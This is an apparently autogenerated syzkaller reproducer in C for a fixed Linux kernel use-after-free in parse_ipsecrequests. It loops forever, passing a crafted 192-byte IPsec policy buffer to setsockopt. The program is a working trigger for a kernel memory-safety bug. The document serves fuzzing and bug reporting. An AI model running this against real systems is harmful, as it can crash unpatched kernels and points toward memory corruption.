// KASAN: use-after-free Read in parse_ipsecrequests
// https://syzkaller.appspot.com/bug?id=6ccf3e9f1987665bbfc996765ba4099a0442c08b
// status:fixed
// autogenerated by syzkaller (http://github.com/google/syzkaller)

#define _GNU_SOURCE

#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

static void test();

void loop()
{
  while (1) {
    test();
  }
}

long r[4];
void test()
{
  memset(r, -1, sizeof(r));
  r[0] = syscall(__NR_mmap, 0x20000000ul, 0xfe9000ul, 0x3ul, 0x32ul,
                 r[0], 0x0ul);
  r[1] = syscall(__NR_socket, 0x2ul, 0x1ul, 0x0ul);
  memcpy((void*)0x20fe8000,
         "\x18\x00\x00\x00\x02\x00\x01\x00\x00\x00\xbe\x8c\x7f\xe1\x8c"
         "\x88\xa2\xe0\x00\x08\x01\x00\xfd\xec\x1f\xda\x1e\x03\x36\x8a"
         "\x45\xdc\x0a\x00\x00\x00\xd8\x98\x05\x5b\xd9\x48\x52\xbb\x6a"
         "\x88\x00\x00\x00\x00\xdb\xa6\x7e\x06\x00\x00\x00\x00\xef\x00"
         "\x00\xdf\x00\xe2\x00\x67\xfc\x21\x63\xe0\x20\x9c\xee\x4a\x5a"
         "\xcb\x3d\x07\x00\x00\x00\xba\x00\x67\x00\x00\xc8\x8e\xbb\xff"
         "\x06\x01\x00\x00\x0b\x01\x00\x00\x00\x24\x00\x00\x00\x00\x00"
         "\x33\xf5\x42\x50\x6b\x02\xec\x00\xaf\x03\x00\x00\x00\x04\xec"
         "\x7e\xe8\x7c\xcc\xff\xf6\xba\x00\x00\x00\xda\x4f\x02\x98\xe9"
         "\xe9\xf5\x54\x06\x2a\x01\x00\x05\x00\x00\x00\x00\x00\x00\x10"
         "\x00\xcc\x91\xa2\xfb\xe3\xc5\x63\x2c\x1a\xdb\x06\x00\x00\x00"
         "\x00\x00\x00\x00\xa2\x1b\x57\x10\x68\x00\x00\x22\x09\x00\x00"
         "\x00\x04\x1a\xd0\xb4\xd2\xc2\x78\xef\x67\x95\x4b",
         192);
  r[3] = syscall(__NR_setsockopt, r[1], 0x0ul, 0x10ul, 0x20fe8000ul,
                 0xc0ul);
}

int main()
{
  loop();
  return 0;
}
